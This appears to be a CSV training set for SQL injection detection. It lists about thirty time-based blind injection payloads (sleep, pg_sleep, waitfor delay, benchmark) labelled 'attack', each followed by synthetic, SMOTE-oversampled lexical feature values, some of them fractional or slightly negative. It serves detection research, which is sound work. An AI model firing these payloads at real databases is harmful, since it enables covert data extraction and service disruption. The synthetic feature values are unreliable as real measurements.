id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000154,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000397,1.6636054314378612,82.24141826934833,26.0,3.5067120907862654,18.701181891123603,18.0,35.08047275644944,10.459763621775279,0.22658684692318565,0.21915926599430086,0.42667894662720224,0.12757494045531131,0.0,0.4597636217752792,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.0,0.4597636217752793,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4597636217752792,0.5402363782247208,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000155,attack,time,1' where 5455  =  5455 and sleep  (  5  )  --,nearest_attack_euclidean,R000642,0.656117490347656,44.69778009645422,19.0,3.3833654629531793,13.0,10.0,16.0,5.697780096454215,0.29087316098287636,0.22374858537144335,0.3579977365943094,0.1273805170513709,0.6977800964542151,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,0.0,3.0,0.6977800964542151,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000156,attack,time,"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000529,0.156037534102903,87.20399433789139,30.0,3.7804585460340188,25.0,18.0,33.96319547031311,10.240798867578278,0.2868515386599432,0.2065331078351591,0.38922859663896137,0.11738675686593636,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.2407988675782775,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000157,attack,time,select sleep  (  5  )   and    (    (   3404  =  3404,nearest_attack_euclidean,R000283,0.3798289804803142,51.03257433979445,16.803257433979446,2.9871493340459248,12.819544603876668,9.0,24.21302973591778,5.0,0.2487844770725499,0.17758088237904782,0.4749785947822646,0.09865604576613768,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8032574339794449,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8032574339794447
SMOTE_000158,attack,time,1'||  (  select 'xqqp' where 3007  =  3007 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000339,0.5877350305635247,122.39202074932322,31.797340249774408,3.6516250118289317,44.993350624436026,10.0,50.398670124887204,17.0,0.3669409837570344,0.08182321922391209,0.41213632433840297,0.13909947268065057,3.0,0.0,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,1.0,1.1993350624436028,0.8006649375563972,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000159,attack,time,1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000512,0.34071167939783187,55.629008296985255,24.703626037123158,4.109343813360911,21.221756222738943,12.0,14.407252074246315,8.0,0.3797912655476544,0.21670755187454377,0.259029481328106,0.14447170124969583,2.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000160,attack,time,"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",nearest_attack_euclidean,R000443,0.1505900095475616,59.829483196200975,23.914741598100488,3.680329581609382,20.829483196200975,10.0,22.0,7.0,0.34808903581949363,0.16715665748218111,0.3677446464607984,0.11700966023752678,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.08525840189951284,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.085258401899513
SMOTE_000161,attack,time,"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000311,0.7805488380113055,90.81694189084703,25.818646790932362,3.434065184523666,21.72711773635588,18.0,40.362706418135275,10.72711773635588,0.23942431725268337,0.19851929740224583,0.44394941650487096,0.1181069688401998,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,5.727117736355879,0.0,0.0,1.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7271177363558793,0.2728822636441207,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000162,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R000534,0.48390024526559183,56.30727412539051,18.346362937304747,3.102535687312594,21.307274125390506,1.1731814686523743,25.653637062695253,8.173181468652373,0.37793928976784763,0.021040738029723532,0.45556709212627483,0.145452880076154,0.0,3.1731814686523734,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8268185313476265,0.0,0.0,0.0,1.0,0.17318146865237352,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",nearest_attack_euclidean,R000215,0.12073137246357821,79.90747274198917,28.90747274198917,4.0291146721615805,30.62989096795668,15.0,25.18505451602166,9.092527258010831,0.3832146830825112,0.18772242129329525,0.3152431959506416,0.1138196996735519,0.0,3.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0462636290054155,0.04626362900541531,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000164,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,0.4003316320661538,50.16860238259808,24.168602382598078,4.080791345001641,17.0,12.0,13.0,8.168602382598078,0.33887598411601283,0.23920657702306786,0.2591404584416569,0.16277698041926247,2.0,0.1686023825980787,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.1686023825980787,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000165,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""gixv""  =  ""gixv",nearest_attack_euclidean,R000680,0.6261967068380937,114.6129305369447,26.53225578858794,3.1947257063577097,38.0,2.0,57.677442114120595,16.93548842282412,0.33391106019149486,0.017574266325868143,0.5008867953356608,0.14762787814697617,0.0,4.0,0.0,0.0,1.0,1.0,0.0,10.935488422824118,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000166,attack,time,"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000375,0.7813733157611541,98.87094495553737,27.0,3.4574130359295467,18.0,21.0,43.8893813904606,15.981563565076767,0.1829699539376874,0.21346494626063528,0.4418301045541382,0.16173499524753918,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,6.981563565076767,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000167,attack,time,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",nearest_attack_euclidean,R000257,0.24320927321835087,101.04871429249947,19.195128570750054,2.731112062217159,14.0,18.0,56.43897143399958,12.609742858499894,0.13877419353847031,0.17842396312089043,0.5581364055472374,0.12466543779340182,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,9.609742858499894,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000168,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""%""  =  """,nearest_attack_euclidean,R000755,0.16317779651574513,73.49378114457133,27.14108032702038,3.8545415873453104,23.56432130808152,15.0,25.0,9.92945983648981,0.32017782348712504,0.2042111785670257,0.3403519642783761,0.13525903366747308,0.0,3.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.92945983648981,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000169,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,0.09577738624501178,84.94693275784616,19.946932757846156,2.947963902312039,27.0,2.0,43.0,12.946932757846156,0.31784773326864896,0.023544276538418438,0.5062019455759965,0.15240604461693605,1.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.0,0.946932757846157,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000170,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000329,0.7519321550297761,104.71995785061253,26.751581165757237,3.3368087393087125,34.24209417121382,10.0,47.981026010913176,12.49683766848553,0.32734880739925787,0.09603364886503149,0.4572020586398113,0.11941548509589937,0.0,1.0,0.0,0.0,1.0,1.0,0.0,8.49683766848553,0.0,0.0,0.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.7515811657572352,0.24841883424276476,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000171,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre",nearest_attack_euclidean,R000102,0.2883207039710345,103.47682920209677,22.747682920209677,2.8990871403298364,21.0,10.0,55.98146336167741,16.495365840419353,0.20332022275510692,0.09681915369290807,0.5405246681030064,0.1593359554489786,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,9.495365840419351,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000172,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000159,0.6469826960983214,103.6469466247194,30.35763359496633,3.554098407385319,33.14351145995511,10.0,47.145801569797975,13.357633594966329,0.32160840584257827,0.09758961705469703,0.4518237323336926,0.12897824476903214,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.2141221350112237,0.0,7.143511459955105,0.0,1.0,0.0,1.2141221350112237,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000173,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""jenb"" like ""jenb",nearest_attack_euclidean,R000537,0.44094259275507114,133.33712809336197,25.207858988329754,3.0172673120144595,43.41571797665951,2.0,69.33712809336197,18.584282023340492,0.3259624041314942,0.015008792290071515,0.5197186467177116,0.13931015686072262,0.0,4.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,13.584282023340496,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.792141011670247,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.792141011670247
SMOTE_000174,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,0.009579696082665835,73.0784396522448,20.99673168115647,3.4271024431211763,22.0,10.0,30.06536637687066,11.013073275374133,0.3011261584028547,0.13687552654675217,0.4113004598141808,0.15069785523621224,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.013073275374132,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000175,attack,time,select pg_sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000431,0.8151225968702724,49.7209401205925,18.337210008613752,3.2469407913260904,18.697680068910003,1.0,21.0232600516825,9.0,0.37282883659942373,0.020444090350059327,0.42273025989998303,0.1839968131505339,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.33721000861375,0.6627899913862498,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,time,waitfor delay '0:0:5' and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000191,1.3221131764154195,53.22676686184164,21.22676686184164,3.49773813077681,18.27137829824437,3.4089222872805465,19.955388563597268,11.591077712719454,0.3415070519514275,0.06384043998358863,0.3764655015197699,0.21818700654521397,5.4089222872805465,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.5910777127194535,0.5910777127194538,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000177,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000401,0.1564980781148004,64.93364842616663,22.93364842616662,3.4893085278384874,19.0,10.0,27.0,8.93364842616662,0.2926107403612582,0.15400565282171486,0.4158152626186301,0.1375683441983968,0.0,0.9336484261666201,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.93364842616662,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000178,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R000421,0.3240634656947062,86.57299274750868,23.0,3.2001211758091124,33.57299274750868,2.0,40.0,11.0,0.38770780180869735,0.023105365969483108,0.4621073193896624,0.12707951283215718,0.0,0.0,2.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.1423357508304399,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.14233575083044
SMOTE_000179,attack,time,1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000599,0.5488548067639308,65.91979375559364,23.689845316695234,3.532861185285854,19.91979375559365,10.0,27.22994843889841,8.770051561101589,0.30174147441634513,0.15179533164862063,0.4131799815222672,0.1332832124127671,0.7700515611015882,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.7700515611015882,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000180,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000731,0.04856768820959321,60.42644279450235,22.056859039266982,3.4714943885818514,19.042644279450236,10.11371807853396,25.22743615706792,6.042644279450235,0.3156400451243462,0.1671404919938915,0.4172194628817623,0.1,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.014214759816745,0.0,4.02842951963349,0.0,1.0,0.0,1.014214759816745,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.014214759816745026,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.014214759816745
SMOTE_000181,attack,time,1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000313,0.07035991444464909,103.87033869337299,25.0,3.2633139404774383,32.0,10.0,48.87033869337298,13.0,0.3080912655588524,0.09627852048714138,0.47046813732072246,0.12516207663328377,0.03241532665675484,0.0,2.0,0.0,1.0,1.0,0.0,8.967584673343245,0.0,0.0,0.0,4.0,0.03241532665675495,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000182,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",nearest_attack_euclidean,R000250,0.8934397210037343,133.31143325312823,25.0,2.921696103177482,39.24573301251291,2.0,72.37713349374354,19.68856674687177,0.29434676394598497,0.015002644680380622,0.5429482733245163,0.14770231804911801,0.0,4.0,0.0,0.0,1.0,0.6885667468717722,0.0,14.0,0.0,0.0,0.0,1.6885667468717722,0.0,1.0,0.0,0.0,0.0,0.6885667468717722,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000183,attack,time,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000240,0.06715280194216611,67.48121580476631,18.0,2.7073108792458447,10.0,10.0,37.584972643813046,9.896243160953262,0.1482698043772962,0.1482698043772962,0.5568375208212343,0.14662287042417338,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,6.8962431609532615,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000184,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R000296,4.793192407750564,146.48257768492982,30.24798973287652,3.826970189401154,59.986598219176784,17.4932991095884,52.2533504452058,16.749329910958842,0.40716288291974734,0.1176894246342663,0.36030832979183086,0.11483936265415548,2.0,0.0,0.0,0.0,1.0,1.0,0.0,8.50134017808232,0.0,0.0,0.7493299109588398,2.5013401780823203,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.2506700890411606,0.0,0.25067008904116034,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.25067008904116034,0.0,0.7493299109588397,0.7493299109588397,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7493299109588398,0.7493299109588398,6.749329910958839
SMOTE_000185,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,1.5285817711204177,80.11768875014486,27.0,3.7462324495650705,20.882311249855135,17.964764250202812,29.423537750028974,11.847075500057946,0.2618340185720372,0.223121143074397,0.3674116420679733,0.14763319628559257,3.4235377500289728,0.0,0.0,0.0,-2.7755575615628914e-17,1.423537750028973,0.0,4.576462249971027,1.423537750028973,0.0,1.0,1.4235377500289728,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.5764622499710272,0.0,0.0,0.0,1.4235377500289728,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
